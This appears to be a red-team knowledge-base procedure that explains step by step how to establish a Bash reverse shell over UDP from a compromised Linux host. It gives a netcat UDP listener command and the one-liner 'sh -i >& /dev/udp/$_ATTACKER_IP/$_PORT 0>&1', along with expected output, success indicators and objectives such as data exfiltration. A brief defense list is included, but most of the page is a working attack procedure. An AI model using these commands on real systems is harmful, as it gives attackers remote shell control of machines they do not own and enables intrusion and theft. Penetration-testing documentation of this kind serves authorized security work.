---
id: 82c88ed3-e98e-4c4c-9245-615d630e6433
name: Establish-Bash-UDP-Reverse-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.178575+00:00'
updated_at: '2023-04-10T20:25:29.481605+00:00'
tactics:
  - '[[Command and Control]]'
techniques:
  - '[[Non-Standard Port]]'
sub_techniques: []
tags:
  - bash
  - udp
  - reverse-shell
commands:
  - '[[commands/nc-udp-listener]]'
  - '[[commands/bash-udp-reverse-shell]]'
platforms:
  - Linux
tools: []
validated: true
---

# Establish-Bash-UDP-Reverse-Shell

## Summary

This procedure establishes a reverse shell connection from a target Linux machine to an attacker's machine using Bash and UDP protocol. It leverages netcat for listening and redirects standard input/output/error streams via UDP to create an interactive shell session, useful for bypassing TCP-only firewall rules.

## Description

In a penetration testing or red team scenario, after gaining initial code execution on a target system with Bash available, this technique creates a reverse connection to the attacker's listener. The UDP protocol can evade some network filters that block common TCP reverse shells. The target initiates the connection by redirecting shell I/O to a UDP socket pointing to the attacker's IP and port. Once connected, the attacker receives a shell prompt for command execution. This is particularly effective in environments where outbound UDP is permitted but TCP is restricted. Success depends on the target having Bash/sh and network access to the attacker's UDP port.

## Requirements

1. Target machine running a Unix-like OS with Bash or sh shell available.
2. Attacker machine with netcat (nc) installed and reachable via UDP from the target.
3. Network connectivity allowing outbound UDP packets from target to attacker's IP/port.
4. Initial execution access on the target (e.g., via RCE or compromised credentials).

## Defense

- Implement network segmentation to isolate critical systems and limit lateral movement.
- Deploy firewalls and intrusion detection/prevention systems (IDS/IPS) to monitor and block anomalous UDP traffic, especially to non-standard ports.
- Enforce application whitelisting and restrict shell execution via tools like AppArmor or SELinux.
- Regularly update and patch software to mitigate initial access vectors leading to code execution.
- Monitor for unexpected outbound UDP connections and shell process anomalies using endpoint detection tools.

## Objectives

1. Establish a persistent interactive shell from the target to the attacker.
2. Enable remote command execution and file access on the target.
3. Facilitate further post-exploitation activities like data exfiltration or privilege escalation.

## Instructions

### Step 1: Start UDP Listener on Attacker Machine

**Context**: Begin by setting up a netcat listener on the attacker's machine to receive the incoming UDP connection from the target. This creates a socket for the reverse shell to connect to.

**Command** ([[commands/nc-udp-listener]]):
```bash
nc -u -lvp $_PORT
```

> This command initiates a UDP listener in verbose mode on the specified port. Replace $_PORT with an open, non-privileged port (e.g., 4242). The listener will wait for the target's connection. If the port is in use or blocked, the command will fail to bind.

**Expected Output**: 
```
listening on [any] $_PORT ...
```

Upon successful connection from the target:
```
connect to [target_ip] from (UNKNOWN) [target_ip] $_PORT
```
Followed by a shell prompt where attacker commands can be entered.

### Step 2: Execute Reverse Shell on Target Machine

**Context**: Once the listener is active, execute the Bash redirection command on the target to spawn a shell and connect back to the attacker via UDP. This redirects stdin, stdout, and stderr to the UDP socket.

**Command** ([[commands/bash-udp-reverse-shell]]):
```bash
sh -i >& /dev/udp/$_ATTACKER_IP/$_PORT 0>&1
```

> Run this command on the target machine after gaining execution access (e.g., via a web shell or compromised process). Replace $_ATTACKER_IP with the attacker's IP address and $_PORT with the listener port. The 'sh -i' spawns an interactive shell, and the redirection sends all I/O over UDP. If the connection succeeds, the attacker will see the shell prompt on their listener.

**Expected Output**: No direct output on the target if successful, as I/O is redirected. On the attacker side, the connection message appears, and commands like 'whoami' or 'pwd' yield target system responses, confirming shell access.

**Success Indicators**:
- Listener receives connection and responds to commands with target output.
- No bind errors on listener or connection timeouts on target.
